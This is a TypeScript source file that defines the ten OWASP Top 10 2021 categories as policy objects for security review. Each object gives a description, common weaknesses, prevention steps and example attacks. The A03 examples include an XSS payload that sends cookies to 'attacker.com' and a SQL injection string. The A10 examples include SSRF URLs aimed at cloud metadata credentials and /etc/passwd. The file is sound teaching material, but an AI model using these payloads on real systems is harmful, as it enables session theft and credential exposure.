/**
 * OWASP Top 10 2021 Policies
 *
 * 10 built-in security policies based on the OWASP Top 10 2021.
 * Each policy includes description, risk factors, prevention strategies,
 * and example attack scenarios. Content is comprehensive enough for
 * an LLM to use as review criteria.
 */

export interface PolicyDefinition {
  identifier: string;
  name: string;
  framework: string;
  keywords: string[];
  content: string;
}

export const owaspTop10Policies: PolicyDefinition[] = [
  {
    identifier: "A01",
    name: "A01:2021 - Broken Access Control",
    framework: "OWASP_TOP_10_2021",
    keywords: ["access control", "authorization", "permission", "rbac", "role", "privilege", "admin", "session", "cors", "directory traversal", "idor"],
    content: `# A01:2021 - Broken Access Control

## Description
Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data, or performing a business function outside the user's limits.

## Risk Factors
- Moving up to #1 from fifth position; 94% of applications were tested for some form of broken access control
- Notable CWEs: CWE-200 (Exposure of Sensitive Information), CWE-201 (Insertion of Sensitive Information), CWE-352 (CSRF)

## Common Vulnerabilities
- Violation of principle of least privilege (access should only be granted for specific capabilities, roles, or users)
- Bypassing access control checks by modifying the URL, internal application state, or HTML page
- Permitting viewing or editing someone else's account by providing its unique identifier (IDOR)
- Accessing API with missing access controls for POST, PUT, DELETE
- Elevation of privilege (acting as a user without being logged in, acting as admin when logged in as user)
- Metadata manipulation (replaying or tampering with JWT tokens, cookies, hidden fields)
- CORS misconfiguration allowing access from unauthorized/untrusted origins
- Force browsing to authenticated pages as unauthenticated user or privileged pages as standard user

## How to Prevent
- Deny by default (except for public resources)
- Implement access control mechanisms once and reuse throughout the application
- Model access controls should enforce record ownership rather than accepting that the user can create/read/update/delete any record
- Unique application business limit requirements should be enforced by domain models
- Disable web server directory listing and ensure file metadata and backup files are not present within web roots
- Log access control failures, alert admins when appropriate
- Rate limit API and controller access to minimize harm from automated attack tooling
- Stateful session identifiers should be invalidated on the server after logout
- JWT tokens should be short-lived to minimize the window of opportunity for attackers

## Example Attack Scenarios
- The application uses unverified data in a SQL call accessing account information: \`/accounts?id=notmyaccount\`
- An attacker force browses to target URLs: \`/admin/deleteuser\` or \`/api/users/delete\`
- An attacker modifies the JWT token to escalate their role claim from "user" to "admin"`,
  },
  {
    identifier: "A02",
    name: "A02:2021 - Cryptographic Failures",
    framework: "OWASP_TOP_10_2021",
    keywords: ["encryption", "cryptography", "tls", "ssl", "hash", "password", "secret", "sensitive data", "certificate", "key management", "plaintext"],
    content: `# A02:2021 - Cryptographic Failures

## Description
Failures related to cryptography (or lack thereof) which often lead to exposure of sensitive data. Formerly known as "Sensitive Data Exposure," this broader category focuses on failures in cryptography rather than just exposure.

## Risk Factors
- Previously #3 (Sensitive Data Exposure), shifted to focus on root cause (cryptographic failures) rather than symptom (data exposure)
- Notable CWEs: CWE-259 (Use of Hard-coded Password), CWE-327 (Broken Crypto Algorithm), CWE-331 (Insufficient Entropy)

## Common Vulnerabilities
- Transmitting data in clear text (HTTP, SMTP, FTP) or with weak TLS configurations
- Using old or weak cryptographic algorithms or protocols (MD5, SHA1, DES, RC4)
- Using default crypto keys, generating weak keys, or missing key rotation/management
- Not enforcing encryption (missing security directives or headers)
- Not validating server certificates and trust chain
- Using deprecated hash functions for password storage (MD5, SHA1 without salt)
- Using encryption without authenticated encryption modes (ECB mode)
- Hard-coding secrets, API keys, or passwords in source code
- Using insufficient randomness for cryptographic purposes

## How to Prevent
- Classify data processed, stored, or transmitted by an application (identify sensitive data per privacy laws/regulations)
- Apply controls as per the data classification
- Don't store sensitive data unnecessarily (discard it as soon as possible or use PCI DSS compliant tokenization)
- Encrypt all sensitive data at rest using strong algorithms (AES-256)
- Ensure up-to-date and strong standard algorithms and protocols are in place (TLS 1.2+); enforce encryption using directives like HSTS
- Use proper key management: generate keys with sufficient entropy, use key rotation
- Encrypt all data in transit with secure protocols (TLS with perfect forward secrecy)
- Store passwords using strong adaptive and salted hashing functions (Argon2id, bcrypt, scrypt)
- Disable caching for response that contain sensitive data
- Verify independently the effectiveness of configuration and settings

## Example Attack Scenarios
- An application encrypts credit card numbers in a database using automatic database encryption, but data is automatically decrypted when retrieved, allowing a SQL injection flaw to retrieve credit card numbers in clear text
- A site doesn't use or enforce TLS for all pages, allowing an attacker to monitor network traffic and downgrade connections from HTTPS to HTTP, intercepting requests and stealing session cookies
- The password database uses unsalted or simple hashes to store passwords, allowing brute-force or rainbow table attacks`,
  },
  {
    identifier: "A03",
    name: "A03:2021 - Injection",
    framework: "OWASP_TOP_10_2021",
    keywords: ["injection", "sql", "xss", "cross-site scripting", "command injection", "ldap", "xpath", "nosql", "orm", "sanitize", "escape", "parameterized"],
    content: `# A03:2021 - Injection

## Description
An application is vulnerable to injection when user-supplied data is not validated, filtered, or sanitized, or when dynamic queries or non-parameterized calls are used without context-aware escaping.

## Risk Factors
- Injection dropped from #1 to #3. 94% of apps were tested for some form of injection
- Notable CWEs: CWE-79 (Cross-site Scripting), CWE-89 (SQL Injection), CWE-73 (External Control of File Name)

## Common Vulnerabilities
- User-supplied data not validated, filtered, or sanitized by the application
- Dynamic queries or non-parameterized calls without context-aware escaping used directly in the interpreter
- Hostile data used within ORM search parameters to extract additional sensitive records
- Hostile data directly used or concatenated (SQL, command, ORM queries, LDAP, XPath, template injection)
- Cross-site scripting (XSS): reflected, stored, and DOM-based

## How to Prevent
- Use a safe API which avoids using the interpreter entirely, provides a parameterized interface, or migrates to ORMs
- Use positive server-side input validation (allowlist, not blocklist)
- For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter
- Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection
- Use Content Security Policy (CSP) as a defense-in-depth against XSS
- Implement automated testing of all parameters, headers, URL, cookies, JSON, SOAP, and XML data inputs
- Use output encoding/escaping close to or at the point of output for XSS prevention

## Example Attack Scenarios
- SQL Injection: \`String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";\`
- An attacker modifies the 'id' parameter to \`' OR '1'='1\`, returning all records
- Command Injection: User input is concatenated into a system command without sanitization
- XSS: Application includes untrusted data in HTML output without proper encoding: \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\``,
  },
  {
    identifier: "A04",
    name: "A04:2021 - Insecure Design",
    framework: "OWASP_TOP_10_2021",
    keywords: ["insecure design", "threat modeling", "secure design", "design pattern", "architecture", "business logic", "abuse case", "security requirement"],
    content: `# A04:2021 - Insecure Design

## Description
A new category for 2021, focusing on risks related to design and architectural flaws. Insecure design is not the source for all other Top 10 risk categories. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks.

## Risk Factors
- New category in 2021. Focuses on design flaws as distinct from implementation bugs
- Notable CWEs: CWE-209 (Generation of Error Message Containing Sensitive Info), CWE-256 (Unprotected Storage of Credentials), CWE-501 (Trust Boundary Violation)

## Common Vulnerabilities
- Missing or ineffective control design for specific business flows (e.g., no rate limiting on password reset)
- Trust boundary violations (trusting client-side validation only)
- Insufficient business logic validation (e.g., allowing negative quantities in checkout)
- Missing threat modeling and security requirements analysis during design phase
- No secure development lifecycle or security architecture review process
- Lack of defense in depth (single point of failure in security controls)

## How to Prevent
- Establish and use a secure development lifecycle with AppSec professionals
- Establish and use a library of secure design patterns or paved road ready-to-use components
- Use threat modeling for critical authentication, access control, business logic, and key flows
- Integrate security language and controls into user stories (abuse cases)
- Integrate plausibility checks at each tier (from frontend to backend to database)
- Write unit and integration tests to validate all critical flows are resistant to the threat model
- Segregate tier layers on the system and network levels depending on exposure and protection needs
- Limit resource consumption by user or service (rate limiting)

## Example Attack Scenarios
- A credential recovery flow might include "questions and answers" which is prohibited by NIST 800-63b. An attacker can easily find answers to such questions
- A cinema chain allows group booking discount and has a maximum of 15 attendees before requiring a deposit. Attackers could threat model this flow and test if they could book 600 seats in a single request, causing massive lost revenue
- A retail chain's e-commerce site does not have bot protection, allowing attackers to buy scalable items immediately at launch using automated bots`,
  },
  {
    identifier: "A05",
    name: "A05:2021 - Security Misconfiguration",
    framework: "OWASP_TOP_10_2021",
    keywords: ["misconfiguration", "default", "hardening", "permissions", "headers", "error handling", "stack trace", "unnecessary features", "cloud", "s3"],
    content: `# A05:2021 - Security Misconfiguration

## Description
The application might be vulnerable if it is missing appropriate security hardening or has improperly configured permissions on cloud services, unnecessary features enabled, default accounts/passwords unchanged, overly informative error handling, or disabled security features.

## Risk Factors
- Moving up from #6, 90% of applications were tested for some form of misconfiguration
- Notable CWEs: CWE-16 (Configuration), CWE-611 (XXE - Improper Restriction of XML External Entity Reference)

## Common Vulnerabilities
- Missing security hardening across any part of the application stack
- Unnecessary features enabled or installed (ports, services, pages, accounts, privileges)
- Default accounts and their passwords still enabled and unchanged
- Error handling reveals stack traces or overly informative error messages to users
- Upgraded systems have latest security features disabled or not configured securely
- Security settings in application servers, frameworks, libraries not set to secure values
- Server does not send security headers or directives (HSTS, CSP, X-Frame-Options)
- Software is out of date or vulnerable
- Cloud storage permissions are overly permissive (public S3 buckets)

## How to Prevent
- A repeatable hardening process makes it fast and easy to deploy a properly locked down environment
- A minimal platform without unnecessary features, components, documentation, samples
- Review and update configurations as part of patch management process
- A segmented application architecture with effective separation between components or tenants (containerization, cloud security groups)
- Sending security directives to clients (security headers)
- An automated process to verify the effectiveness of configurations and settings in all environments
- Use infrastructure as code and configuration management tools to ensure consistency

## Example Attack Scenarios
- The application server comes with sample applications not removed from the production server. These known security flaws attackers can use to compromise the server
- Directory listing is not disabled. An attacker discovers they can list directories and finds compiled Java classes to decompile and reverse engineer
- The application server's configuration allows detailed error messages (stack traces) to be returned, potentially exposing sensitive information or underlying flaws
- A cloud service provider has default open sharing permissions, allowing access to sensitive data stored in cloud storage`,
  },
  {
    identifier: "A06",
    name: "A06:2021 - Vulnerable and Outdated Components",
    framework: "OWASP_TOP_10_2021",
    keywords: ["dependency", "vulnerability", "cve", "outdated", "library", "component", "package", "npm", "supply chain", "version", "patch"],
    content: `# A06:2021 - Vulnerable and Outdated Components

## Description
Components (libraries, frameworks, and other software modules) run with the same privileges as the application. If a vulnerable component is exploited, it can cause serious data loss or server takeover.

## Risk Factors
- #2 in OWASP community survey, also had enough data to make the Top 10 via data
- Notable CWEs: CWE-1104 (Use of Unmaintained Third-Party Components)

## Common Vulnerabilities
- Not knowing versions of all components used (both client-side and server-side), including nested dependencies
- Using software that is vulnerable, unsupported, or out of date (OS, web/application server, DBMS, applications, APIs, libraries, runtime)
- Not scanning for vulnerabilities regularly or subscribing to security bulletins
- Not fixing or upgrading the underlying platform, frameworks, and dependencies in a timely manner
- Not testing compatibility of updated, upgraded, or patched libraries
- Not securing components' configurations (see A05)

## How to Prevent
- Remove unused dependencies, unnecessary features, components, files, and documentation
- Continuously inventory versions of both client-side and server-side components and their dependencies (npm audit, Snyk, Dependabot)
- Monitor sources like CVE, NVD for vulnerabilities in components; use software composition analysis tools
- Only obtain components from official sources over secure links; prefer signed packages
- Monitor for libraries and components that are unmaintained or do not create security patches for older versions
- Every organization must ensure an ongoing plan for monitoring, triaging, and applying updates or configuration changes for the lifetime of the application

## Example Attack Scenarios
- CVE-2017-5638 (Apache Struts 2 remote code execution) has been linked to significant breaches. Components typically run with the same privileges as the application
- An IoT device uses an outdated version of a library with a known critical vulnerability that allows remote code execution
- Automated tools like Shodan can find devices still vulnerable to Heartbleed (patched April 2014)`,
  },
  {
    identifier: "A07",
    name: "A07:2021 - Identification and Authentication Failures",
    framework: "OWASP_TOP_10_2021",
    keywords: ["authentication", "login", "password", "credential", "brute force", "session", "mfa", "multi-factor", "oauth", "token", "sso"],
    content: `# A07:2021 - Identification and Authentication Failures

## Description
Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks. Formerly "Broken Authentication," this category slid down from #2 due to increased availability of standardized frameworks.

## Risk Factors
- Previously #2, dropped to #7. Includes CWEs related to identification failures
- Notable CWEs: CWE-297 (Improper Validation of Certificate), CWE-287 (Improper Authentication), CWE-384 (Session Fixation)

## Common Vulnerabilities
- Permits automated attacks such as credential stuffing (attacker has list of valid usernames and passwords)
- Permits brute force or other automated attacks
- Permits default, weak, or well-known passwords (Password1, admin/admin)
- Uses weak or ineffective credential recovery processes (knowledge-based answers)
- Uses plain text, encrypted, or weakly hashed passwords data stores
- Has missing or ineffective multi-factor authentication
- Exposes session identifier in the URL
- Reuses session identifier after successful login (session fixation)
- Does not correctly invalidate session IDs (sessions or tokens not invalidated during logout or inactivity period)

## How to Prevent
- Implement multi-factor authentication to prevent automated credential stuffing, brute force, and stolen credential reuse attacks
- Do not ship or deploy with any default credentials, particularly for admin users
- Implement weak password checks against a list of the top 10,000 worst passwords
- Align password length, complexity, and rotation policies with NIST 800-63b guidelines
- Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks
- Limit or increasingly delay failed login attempts (rate limiting, account lockout after N failures)
- Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login
- Session identifiers should not be in the URL, be securely stored, and invalidated after logout, idle, and absolute timeouts

## Example Attack Scenarios
- Credential stuffing: the attacker uses lists of known passwords and automated tools to try them against all accounts
- An application session timeout isn't set properly. A user uses a public computer to access an application; instead of selecting "logout," the user simply closes the browser tab. An attacker uses the same browser an hour later, and the user is still authenticated
- An attacker gains access to the password database. User passwords are not properly hashed, exposing every user's password to the attacker`,
  },
  {
    identifier: "A08",
    name: "A08:2021 - Software and Data Integrity Failures",
    framework: "OWASP_TOP_10_2021",
    keywords: ["integrity", "ci/cd", "pipeline", "deserialization", "auto-update", "supply chain", "code signing", "dependency", "serialization", "trust"],
    content: `# A08:2021 - Software and Data Integrity Failures

## Description
Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. This includes using software from untrusted sources, insecure CI/CD pipelines, and insecure deserialization.

## Risk Factors
- New category for 2021. CWE-502 (Deserialization of Untrusted Data) merged here
- Notable CWEs: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-494 (Download of Code Without Integrity Check)

## Common Vulnerabilities
- Using libraries or modules from untrusted sources, repositories, or CDNs without integrity verification
- An insecure CI/CD pipeline introducing unauthorized access, malicious code, or system compromise
- Auto-update functionality that downloads updates without sufficient integrity verification
- Insecure deserialization where objects or data are sent to the application without proper validation
- Applications that rely on plugins, libraries, or modules from untrusted sources without verification (SRI for CDN resources)

## How to Prevent
- Use digital signatures or similar mechanisms to verify software or data is from the expected source and has not been altered
- Ensure libraries and dependencies (npm, Maven) are consuming trusted repositories
- Use a software supply chain security tool (OWASP Dependency-Check, npm audit) to verify components don't contain known vulnerabilities
- Ensure there is a review process for code and configuration changes to minimize the chance that malicious code or configuration could be introduced
- Ensure your CI/CD pipeline has proper segregation, configuration, and access control to ensure the integrity of the code flowing through the build and deploy processes
- Ensure that unsigned or unencrypted serialized data is not sent to untrusted clients without some form of integrity check or digital signature
- Use Subresource Integrity (SRI) for CDN-hosted resources

## Example Attack Scenarios
- A React application calls a set of Spring Boot microservices. Attackers identified the Java serialization endpoint and used Java Serial Killer to gain remote code execution on the application server
- An attacker compromises a CI/CD pipeline to inject malicious code that gets deployed to production (SolarWinds-style attack)
- An auto-update mechanism for firmware doesn't verify signatures, allowing an attacker to push malicious firmware`,
  },
  {
    identifier: "A09",
    name: "A09:2021 - Security Logging and Monitoring Failures",
    framework: "OWASP_TOP_10_2021",
    keywords: ["logging", "monitoring", "audit", "alerting", "incident", "detection", "log injection", "siem", "observability", "tracing"],
    content: `# A09:2021 - Security Logging and Monitoring Failures

## Description
Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs any time auditable events are not logged, warnings and errors generate no or inadequate log messages, or logs are not monitored for suspicious activity.

## Risk Factors
- Previously #10, moved up to #9 based on industry survey
- Notable CWEs: CWE-778 (Insufficient Logging), CWE-117 (Improper Output Neutralization for Logs), CWE-223 (Omission of Security-relevant Information)

## Common Vulnerabilities
- Auditable events (logins, failed logins, high-value transactions) are not logged
- Warnings and errors generate no, inadequate, or unclear log messages
- Logs of applications and APIs are not monitored for suspicious activity
- Logs are only stored locally (not centralized or backed up)
- Appropriate alerting thresholds and response escalation processes are not in place or effective
- Penetration testing and scans by DAST tools do not trigger alerts
- The application cannot detect, escalate, or alert for active attacks in real-time or near real-time
- Information leakage by making logging and alerting events visible to a user or an attacker (log injection)

## How to Prevent
- Ensure all login, access control, and server-side input validation failures can be logged with sufficient user context to identify suspicious accounts
- Ensure logs are generated in a format easily consumed by centralized log management solutions (structured logging)
- Ensure high-value transactions have an audit trail with integrity controls to prevent tampering (append-only database tables)
- Establish or adopt an incident response and recovery plan
- Establish effective monitoring and alerting so suspicious activities are detected and responded to quickly
- Use application-level security monitoring for real-time detection (WAF, RASP)
- Protect logs from injection and tampering (sanitize log inputs, use structured logging)

## Example Attack Scenarios
- A children's health plan provider's website operator couldn't detect a breach for over 7 years due to a lack of monitoring and logging
- A major European airline suffered a payment card data breach for more than 20 days due to insufficient logging of payment application access
- An attacker injects malicious content into logs (log injection) to confuse log analysis tools or hide their tracks`,
  },
  {
    identifier: "A10",
    name: "A10:2021 - Server-Side Request Forgery (SSRF)",
    framework: "OWASP_TOP_10_2021",
    keywords: ["ssrf", "server-side request forgery", "url", "fetch", "internal", "metadata", "cloud", "imds", "localhost", "redirect"],
    content: `# A10:2021 - Server-Side Request Forgery (SSRF)

## Description
SSRF flaws occur whenever a web application fetches a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

## Risk Factors
- New category added from community survey (#1 in the survey). Data shows a relatively low incidence rate but high impact
- Notable CWEs: CWE-918 (Server-Side Request Forgery)

## Common Vulnerabilities
- Application fetches a remote resource based on user-supplied URL without validation
- Attacker can access internal services behind the firewall (internal APIs, databases, cloud metadata)
- Attacker can access cloud service metadata endpoints (AWS IMDS at 169.254.169.254)
- Attacker can scan internal ports and services
- Attacker can read local files using file:// protocol
- URL redirects used to bypass SSRF protections (open redirects chained with SSRF)

## How to Prevent
- Segment remote resource access functionality in separate networks to reduce the impact of SSRF
- Enforce "deny by default" firewall policies or network access control rules
- Sanitize and validate all client-supplied input data (URL allowlist, not blocklist)
- Do not send raw responses to clients (validate response type and content)
- Disable HTTP redirections (or validate redirect targets)
- Use URL schemas/ports/destinations allowlist (not blocklist approach)
- Do not deploy other security-relevant services on front-end systems (e.g., metadata service on app server)
- For residual SSRF, don't mitigate via deny lists or regular expressions. Use network-level controls and positive/allowlist-based approaches
- Disable unused URL schemas (file://, gopher://, dict://)
- Use cloud provider metadata service IMDSv2 with hop limit of 1 (AWS)

## Example Attack Scenarios
- An attacker crafts URL input to access cloud metadata: \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
- Port scanning internal servers: \`http://internal-server:8080/admin\`
- Accessing internal services: The application server can access monitoring systems, internal configuration stores, or other internal services that are not directly accessible from the external network
- File access: \`file:///etc/passwd\` on Linux systems through SSRF vulnerability`,
  },
];
